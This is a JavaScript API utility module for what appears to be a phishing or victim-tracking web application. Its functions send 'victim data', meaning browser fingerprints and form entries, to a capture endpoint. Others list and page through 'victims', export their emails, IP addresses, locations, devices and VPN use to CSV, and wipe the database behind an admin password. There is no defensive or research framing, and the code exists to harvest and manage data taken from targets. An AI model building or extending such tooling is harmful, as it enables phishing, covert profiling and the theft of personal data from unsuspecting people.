/**
 * API Utility Functions
 *
 * Handles all communication with serverless backend functions
 */

const API_BASE = import.meta.env.VITE_API_URL || '';

/**
 * Capture victim data and send to backend
 * @param {Object} data - Complete fingerprint and form data
 * @returns {Promise<Object>} Response from server
 */
export async function captureData(data) {
  try {
    const response = await fetch(`${API_BASE}/api/capture`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    return await response.json();
  } catch (error) {
    console.error('Error capturing data:', error);
    throw error;
  }
}

/**
 * Fetch statistics for dashboard
 * @returns {Promise<Object>} Statistics data
 */
export async function fetchStats() {
  try {
    const response = await fetch(`${API_BASE}/api/stats`);

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    return await response.json();
  } catch (error) {
    console.error('Error fetching stats:', error);
    throw error;
  }
}

/**
 * Fetch victims list with pagination
 * @param {number} page - Page number
 * @param {number} limit - Items per page
 * @param {string} sort - Sort field
 * @returns {Promise<Object>} Paginated victims data
 */
export async function fetchVictims(page = 1, limit = 20, sort = '-timestamp') {
  try {
    const response = await fetch(
      `${API_BASE}/api/victims?page=${page}&limit=${limit}&sort=${sort}`
    );

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    return await response.json();
  } catch (error) {
    console.error('Error fetching victims:', error);
    throw error;
  }
}

/**
 * Clear all data from database
 * @param {string} password - Admin password
 * @returns {Promise<Object>} Success response
 */
export async function clearDatabase(password) {
  try {
    const response = await fetch(`${API_BASE}/api/clear`, {
      method: 'DELETE',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ password }),
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    return await response.json();
  } catch (error) {
    console.error('Error clearing database:', error);
    throw error;
  }
}

/**
 * Export victims data to CSV
 * @param {Array} victims - Victims data
 * @returns {string} CSV string
 */
export function exportToCSV(victims) {
  const headers = [
    'Timestamp',
    'Email',
    'IP',
    'City',
    'Country',
    'Browser',
    'OS',
    'Device Type',
    'Screen Resolution',
    'Time on Page (seconds)',
    'Likely VPN'
  ];

  const rows = victims.map(v => [
    new Date(v.timestamp).toLocaleString(),
    v.metadata?.formData?.email || 'N/A',
    v.network?.ip || 'N/A',
    v.network?.city || 'N/A',
    v.network?.country_name || 'N/A',
    `${v.browser?.name || 'Unknown'} ${v.browser?.version || ''}`,
    `${v.os?.name || 'Unknown'} ${v.os?.version || ''}`,
    v.device?.type || 'Unknown',
    v.screen?.resolution || 'N/A',
    v.behavior?.timeOnPage || 0,
    v.network?.vpnDetection?.likelyVPN ? 'Yes' : 'No'
  ]);

  const csvContent = [
    headers.join(','),
    ...rows.map(row => row.map(cell => `"${cell}"`).join(','))
  ].join('\n');

  return csvContent;
}

/**
 * Download CSV file
 * @param {string} csvContent - CSV string content
 * @param {string} filename - File name
 */
export function downloadCSV(csvContent, filename = 'victims-data.csv') {
  const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
  const link = document.createElement('a');
  const url = URL.createObjectURL(blob);

  link.setAttribute('href', url);
  link.setAttribute('download', filename);
  link.style.visibility = 'hidden';

  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}
